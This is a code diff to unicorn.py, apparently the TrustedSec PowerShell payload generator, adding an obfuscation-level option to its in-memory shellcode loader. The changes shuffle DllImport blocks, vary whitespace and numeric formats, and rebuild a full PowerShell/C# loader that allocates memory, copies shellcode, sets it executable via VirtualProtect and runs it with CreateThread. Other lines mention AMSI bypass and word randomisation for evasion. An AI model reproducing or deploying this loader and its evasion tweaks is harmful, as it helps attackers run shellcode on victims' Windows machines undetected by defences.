@@ -70,10 +70,12 @@ AMSI_BYPASS="ON"
 AMSI_MODE="inline"
 OUTPUT_PROFILE="auto"
 TARGET_ARCH="x86"
+OBFUSCATION_LEVEL="minimal"
 RANDOM_SEED=None
 LAST_SHELLCODE_BYTES=None
 LAST_SHELLCODE_SHA256=None
 LAST_LOADER_APIS=None
+LAST_OBFUSCATION_TRANSFORMS=None
 CMD_LENGTH_LIMIT=8191
 POWERSHELL_LENGTH_LIMIT=32767
 
@@ -136,11 +138,41 @@ def parse_shellcode_bytes(data):
 def sha256_bytes(data):
     return hashlib.sha256(data).hexdigest()
 
+def obfuscation_transformations(level):
+    transforms = ["variable-names", "shellcode-marker", "loader-variant"]
+    if level in ("moderate", "high"):
+        transforms.append("import-order")
+    if level == "high":
+        transforms.extend(["whitespace", "numeric-format"])
+    return transforms
+
+def shuffled_imports(imports, level):
+    if level == "minimal":
+        return list(imports)
+    return random.sample(imports, len(imports))
+
+def obfuscation_whitespace(loader, level):
+    if level == "minimal":
+        return loader
+    if level == "moderate":
+        return loader.replace(";", "; ")
+    return loader.replace(";", ";  ")
+
+def format_obfuscated_number(value, level):
+    if level == "high" and random.choice([True, False]):
+        return str(value)
+    return "0x{0:x}".format(value)
+
 def parse_generator_options(argv):
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument("--amsi", choices=["off", "inline"], default=None)
     parser.add_argument("--profile", choices=["auto", "cmd", "powershell"], default=None)
     parser.add_argument("--arch", choices=["x86", "x64"], default=None)
+    parser.add_argument(
+        "--obfuscation",
+        choices=["minimal", "moderate", "high"],
+        default=None,
+    )
     parser.add_argument("--seed", default=None)
     known, remaining = parser.parse_known_args(argv)
     return known, remaining
@@ -155,6 +187,8 @@ if _generator_options.profile:
     OUTPUT_PROFILE = _generator_options.profile
 if _generator_options.arch:
     TARGET_ARCH = _generator_options.arch
+if _generator_options.obfuscation:
+    OBFUSCATION_LEVEL = _generator_options.obfuscation
 set_generator_seed(_generator_options.seed)
 
 # randomize words for evasion
@@ -605,6 +639,7 @@ def gen_usage():
     print("AMSI Mode: python unicorn.py <command> --amsi off")
     print("Profile: python unicorn.py <command> --profile cmd|powershell")
     print("Architecture: python unicorn.py <command> --arch x86|x64")
+    print("Obfuscation: python unicorn.py <command> --obfuscation minimal|moderate|high")
     print("Reproducibility: python unicorn.py <command> --seed <value>")
     print("Help Menu: python unicorn.py --help\n")
 
@@ -912,7 +947,7 @@ def generate_shellcode(payload, ipaddr, port):
 # generate the in-process shellcode loader. `format_payload` handles the final
 # encoded command and the architecture-specific PowerShell child process.
 def gen_shellcode_attack(payload, ipaddr, port, copy_mode=None):
-    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS
+    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS, LAST_OBFUSCATION_TRANSFORMS
 
     if ipaddr != "cobaltstrike":
         shellcode_text = generate_shellcode(payload, ipaddr, port).rstrip()
@@ -959,11 +994,25 @@ def gen_shellcode_attack(payload, ipaddr, port, copy_mode=None):
         copy_code = '[System.Runtime.InteropServices.Marshal]::Copy(%SHELLCODE%, 0, %ALLOCATION%, %SHELLCODE%.Length)'
         LAST_LOADER_APIS = ["calloc", "Marshal.Copy", "VirtualProtect", "CreateThread"]
 
-    loader = r'''%SOURCE%='[DllImport(("%MSV%"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%KERNEL%")]public static extern bool VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %OLD%);%MEMSET_IMPORT%[DllImport("%KERNEL%")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr %THREAD_PARAM%);';%SHELLCODE%="%SHELLCODE_BYTES%";%TYPE%=Add-Type -pass -m %SOURCE% -Name "%CLASS_NAME%" -names "%NAMESPACE%";[byte[]]%SHELLCODE% = %SHELLCODE%.replace("%MARKER%", "0x").Split(",");%LENGTH%=0x%ALLOC_SIZE%;%ALLOCATION%=%TYPE%::calloc(%LENGTH%, 1);[UInt64]%TEMP% = 0;%COPY_CODE%;%TYPE%::VirtualProtect(%ALLOCATION%, %LENGTH%, 0x40, [Ref]%TEMP%);%THREAD_VAR%=[IntPtr]::Zero;%TYPE%::CreateThread([IntPtr]::Zero, 0, %ALLOCATION%, [IntPtr]::Zero, 0, [Ref]%THREAD_VAR%);'''
+    import_blocks = [
+        '[DllImport(("%MSV%"))]public static extern IntPtr calloc(uint dwSize, uint amount);',
+        '[DllImport("%KERNEL%")]public static extern bool VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %OLD%);',
+    ]
+    if copy_mode == "memset":
+        import_blocks.append(memset_import)
+    import_blocks.append(
+        '[DllImport("%KERNEL%")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr %THREAD_PARAM%);'
+    )
+    csharp_source = "".join(shuffled_imports(import_blocks, OBFUSCATION_LEVEL))
+
+    allocation_literal = format_obfuscated_number(allocation_size, OBFUSCATION_LEVEL)
+    protect_literal = format_obfuscated_number(0x40, OBFUSCATION_LEVEL)
+
+    loader = r'''%SOURCE%='%CSHARP_SOURCE%';%SHELLCODE%="%SHELLCODE_BYTES%";%TYPE%=Add-Type -pass -m %SOURCE% -Name "%CLASS_NAME%" -names "%NAMESPACE%";[byte[]]%SHELLCODE% = %SHELLCODE%.replace("%MARKER%", "0x").Split(",");%LENGTH%=%ALLOC_SIZE%;%ALLOCATION%=%TYPE%::calloc(%LENGTH%, 1);[UInt64]%TEMP% = 0;%COPY_CODE%;%TYPE%::VirtualProtect(%ALLOCATION%, %LENGTH%, %PROTECT%, [Ref]%TEMP%);%THREAD_VAR%=[IntPtr]::Zero;%TYPE%::CreateThread([IntPtr]::Zero, 0, %ALLOCATION%, [IntPtr]::Zero, 0, [Ref]%THREAD_VAR%);'''
 
     replacements = {
         "%SOURCE%": source,
-        "%MEMSET_IMPORT%": memset_import,
+        "%CSHARP_SOURCE%": csharp_source,
         "%MSV%": msv,
         "%KERNEL%": kernel,
         "%OLD%": old_protect[1:],
@@ -977,13 +1026,17 @@ def gen_shellcode_attack(payload, ipaddr, port, copy_mode=None):
         "%NAMESPACE%": namespace,
         "%MARKER%": marker,
         "%LENGTH%": length,
-        "%ALLOC_SIZE%": format(allocation_size, "x"),
+        "%ALLOC_SIZE%": allocation_literal,
+        "%PROTECT%": protect_literal,
         "%ALLOCATION%": allocation,
         "%TEMP%": temporary,
         "%INDEX%": index,
     }
     for token, value in replacements.items():
         loader = loader.replace(token, value)
+
+    loader = obfuscation_whitespace(loader, OBFUSCATION_LEVEL)
+    LAST_OBFUSCATION_TRANSFORMS = obfuscation_transformations(OBFUSCATION_LEVEL)
 
     if PRINT_DECODED.lower() == "on":
         if AMSI_MODE != "off":
@@ -1007,7 +1060,7 @@ def gen_ps1_attack(ps1path):
 
 
 def format_payload(powershell_code, attack_type, attack_modifier, option):
-    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS
+    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS, LAST_OBFUSCATION_TRANSFORMS
 
     gen_unicorn()
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -1018,6 +1071,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         LAST_SHELLCODE_BYTES = None
         LAST_SHELLCODE_SHA256 = None
         LAST_LOADER_APIS = []
+        LAST_OBFUSCATION_TRANSFORMS = []
 
     if OUTPUT_PROFILE == "cmd":
         command_limit = CMD_LENGTH_LIMIT
@@ -1168,6 +1222,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             "powershell_path": child_path,
             "encoded_child_sha256": hashlib.sha256(manifest_command.encode("utf-8")).hexdigest(),
             "raw_child_sha256": hashlib.sha256(child_script.encode("utf-8")).hexdigest(),
+        },
+        "obfuscation": {
+            "level": OBFUSCATION_LEVEL,
+            "transformations": LAST_OBFUSCATION_TRANSFORMS or [],
         },
         "apis": LAST_LOADER_APIS or [],
     }
